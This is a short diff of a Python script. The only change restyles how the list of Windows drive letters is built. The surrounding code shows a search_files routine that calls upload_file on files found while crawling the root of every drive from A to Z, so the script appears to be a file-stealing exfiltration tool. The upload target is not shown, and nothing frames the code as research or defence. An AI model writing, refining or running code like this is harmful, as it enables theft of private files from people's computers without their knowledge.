@@ -50,6 +50,8 @@ def search_files(directory):
                 upload_file(file_path)
 
 # Call search_files for all drives
-drives = ['%s:' % d for d in 'ABCDEFGHIJKLMNOPQRSTUVWXYZ' if os.path.exists('%s:' % d)]
+drives = [
+    f'{d}:' for d in 'ABCDEFGHIJKLMNOPQRSTUVWXYZ' if os.path.exists(f'{d}:')
+]
 for drive in drives:
     search_files(os.path.join(drive, '/'))
